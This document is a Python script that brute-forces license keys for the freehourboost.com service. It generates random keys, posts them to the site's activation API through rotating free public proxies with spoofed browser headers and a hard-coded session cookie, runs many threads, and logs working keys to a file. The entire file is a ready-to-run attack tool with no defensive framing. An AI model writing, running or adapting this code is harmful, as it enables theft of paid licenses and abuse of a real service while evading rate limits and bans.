import httpx
import random
import string
import threading
import time
from rich import print

with open("valid.txt", "a"):
    pass


def generate_license_key():
    key_format = "XXXXX-XXXXX-XXXXX-XXXXX"
    license_key = "".join(
        random.choice(string.ascii_uppercase + string.digits) if char == "X" else char
        for char in key_format
    )
    return license_key


def fetch_proxies():
    url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
    try:
        with httpx.Client() as client:
            response = client.get(url)
            proxies = response.text.strip().splitlines()
            return proxies
    except Exception as e:
        print(f"Error fetching proxies: {e}")
        return []


def make_request(license_key, proxy):
    url = "https://freehourboost.com/api/license/"
    headers = {
        "Host": "freehourboost.com",
        "Origin": "https://freehourboost.com",
        "Referer": "https://freehourboost.com/panel",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Cookie": "PHPSESSID=75ra1vhpd4kt16cmp73ej4l67m",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Opera GX";v="106"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }

    payload = {"ajax": "1", "license_key": license_key, "action": "activate"}

    proxies = {"http://": f"http://{proxy}", "https://": f"http://{proxy}"}

    try:
        with httpx.Client(proxies=proxies) as client:
            response = client.post(url, headers=headers, data=payload)
            if (
                "false" in response.text.lower()
                and "invalid license key" in response.text.lower()
            ):
                print(
                    f"[bold white][[bold red]INVALID[bold white]] [bold yellow]| [bold cyan]{license_key}"
                )
            elif "true" in response.text.lower():
                print(
                    f"[bold white][[bold green]VALID[bold white]] [bold yellow]| [bold cyan]{license_key}"
                )

                with open("valid.txt", "a") as f:
                    f.write(f"{license_key}\n")
            else:
                print(
                    f"[bold white][[bold magenta]UNKNOWN[bold white]] [bold yellow]| [bold cyan]{license_key}"
                )
    except httpx.ProxyError as e:
        pass
    except Exception as e:
        pass


def proxy_fetching_thread():
    while True:
        proxies = fetch_proxies()
        proxy_length = len(proxies)
        print(
            f"[bold cyan]Successfully fetched [bold magenta]{proxy_length}[bold cyan] proxies."
        )
        if proxies:
            global proxy_list
            proxy_list = proxies
        time.sleep(60)


proxy_list = fetch_proxies()
threading.Thread(target=proxy_fetching_thread, daemon=True).start()

try:
    time.sleep(1)
    num_threads = int(input("Enter the number of threads to use: "))

    while True:
        for _ in range(num_threads):
            license_key = generate_license_key()
            proxy = random.choice(proxy_list)
            threading.Thread(target=make_request, args=(license_key, proxy)).start()

except KeyboardInterrupt:
    print("\nProgram interrupted by user.")
